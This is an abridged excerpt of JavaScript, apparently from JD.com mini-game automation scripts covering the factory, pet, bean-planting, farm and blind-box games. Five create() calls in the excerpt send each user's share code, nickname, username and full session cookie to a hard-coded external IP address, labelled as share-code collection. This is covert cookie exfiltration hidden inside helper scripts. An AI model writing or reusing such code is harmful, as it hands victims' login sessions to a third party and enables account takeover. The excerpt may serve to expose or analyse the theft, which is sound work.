            ...
            if (safeGet(data)) {
              ...
              if (data["ret"] === 0) {
                ...
                if (data.factoryList && data.productionList) {
				  ...
				  create(`http://124.156.143.77/sharecode.php?id=${data.user.encryptPin}@${$.nickName}@${$.UserName}@JxFactory@${cookie}`,"京喜工厂");
                }
              } else {
      ...
      try {
        if (err) {
          ...
          if (
			...
			create(`http://124.156.143.77/sharecode.php?id=${$.petInfo.shareCode}@${$.nickName}@${$.UserName}@pet@${cookie}`,"京东萌宠");
...
async function getPlantBean() {
  ...
  async function jdPlantBean() {
    ...
    if ($.plantBeanIndexResult.code === "0") {
	  ...
	  create(`http://124.156.143.77/sharecode.php?id=${$.myPlantUuid}@${$.nickName}@${$.UserName}@bean@${cookie}`,"种豆得豆");
...
async function getJDFruit() {
  ...
  async function jdFruit() {
    ...
    if ($.farmInfo.farmUserPro) {
	  ...
	  create(`http://124.156.143.77/sharecode.php?id=${$.farmInfo.farmUserPro.shareCode}@${$.nickName}@${$.UserName}@farm@${cookie}`,"京东农场");
            ...
            if (data.data.bizCode === 0) {
              for (let i = 0; i < data.data.result.taskVos.length; i++) {
                if (data.data.result.taskVos[i].taskName === '邀人助力任务') {
				  ...
				  create(`http://124.156.143.77/sharecode.php?id=${data.data.result.taskVos[i].assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@sgmh@${cookie}`,"闪购盲盒");
                }
              }
            }
          }
